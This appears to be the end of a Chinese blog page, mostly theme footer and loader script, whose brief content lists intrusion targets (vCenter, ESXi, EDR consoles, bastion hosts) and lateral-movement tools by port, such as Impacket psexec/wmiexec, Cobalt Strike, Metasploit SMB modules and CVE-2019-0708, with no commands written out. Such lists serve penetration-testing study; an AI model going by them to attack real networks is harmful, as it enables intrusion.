+<h2 id="集权系统"><a href="#集权系统" class="headerlink" title="集权系统"></a>集权系统</h2><p>VCenter</p>
+<p>ESXI</p>
+<p>天擎服务端</p>
+<p>深信服EDR</p>
+<p>堡垒机</p>
+<h2 id="主机漏洞"><a href="#主机漏洞" class="headerlink" title="主机漏洞"></a>主机漏洞</h2><p>135			Wmihacker、ShareWmi</p>
+<p>445			CS - psexec、MSF - exploit&#x2F;windows&#x2F;smb&#x2F;、IPC连接、Impacket工具包（psexec、smbexec、wmiexec）</p>
+<p>3389		RDP CVE-2019-0708</p>
+<p>5985		WinRM</p>
+<p>CS 4.1</p>
+<p>毒液Venom</p>
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/A_OS/Windows/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E9%9B%86/">windows 工具集</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/A_OS/Windows/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E4%B9%8B%E4%BF%A1%E5%8F%B7%E9%87%8FSeamphorse/">【Windows】线程同步之信号量（Semaphores）</a></div></section></div>
+
+
+<div class="related-wrap reveal" id="related-posts">
+    <section class="header">
+      <div class="title cap theme">您可能感兴趣的文章</div>
+    </section>
+    <section class="body">
+    <div class="related-posts"><a class="item" href="\A_OS\Windows\FormatErrMessage\" title="FormatMessage函数的使用"><span class="title">FormatMessage函数的使用</span></a><a class="item" href="\A_OS\Windows\windows聚焦问题\" title="Windows聚焦不更新"><span class="title">Windows聚焦不更新</span></a><a class="item" href="\A_OS\Windows\刷新托盘图标\" title="【Windows】刷新托盘图标"><span class="title">【Windows】刷新托盘图标</span></a><a class="item" href="\A_OS\Windows\命令行打开系统设置页\" title="【Windows】Win 10/11 通过命令行打开系统设置页面"><span class="title">【Windows】Win 10/11 通过命令行打开系统设置页面</span></a><a class="item" href="\A_OS\Windows\工具\工具集\" title="windows 工具集"><span class="title">windows 工具集</span></a></div></section></div>
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class="float-panel mobile-only blur" style="display:none">
+  <button type="button" class="sidebar-toggle mobile" onclick="sidebar.toggle()">
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewbox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"/><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"/></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class="scripts">
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
